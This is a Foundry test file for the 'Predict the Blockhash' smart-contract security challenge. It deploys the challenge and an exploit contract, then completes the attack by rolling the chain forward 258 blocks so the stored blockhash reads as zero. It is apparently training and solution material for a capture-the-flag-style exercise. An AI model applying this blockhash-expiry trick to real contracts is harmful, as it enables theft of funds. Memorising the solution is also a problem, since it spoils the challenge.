// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "../src/PredictTheBlockhash.sol";

contract PredictTheBlockhashTest is Test {
    PredictTheBlockhash public predictTheBlockhash;
    PredictTheBlockhashExploit public predictTheBlockhashExploit;

    function setUp() public {
        // Deploy contracts
        predictTheBlockhash = (new PredictTheBlockhash){value: 1 ether}();
        predictTheBlockhashExploit = new PredictTheBlockhashExploit{value: 1 ether}(payable(address(predictTheBlockhash)));
        // vm.deal(address(predictTheBlockhashExploit), 1 ether);
    }

    function testExploit() public {
        // Set block number
        uint256 blockNumber = block.number;

        // To roll forward, add the number of blocks to blockNumber,
        // Eg. roll forward 10 blocks: blockNumber + 10
        // Put your solution here
        // vm.roll(blockNumber);
        predictTheBlockhashExploit.executeAttack{value: 1 ether}();

        vm.roll(blockNumber + 258);
        predictTheBlockhashExploit.finalizeAttack();
        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(predictTheBlockhash.isComplete(), "Challenge Incomplete");
    }

    receive() external payable {}
}
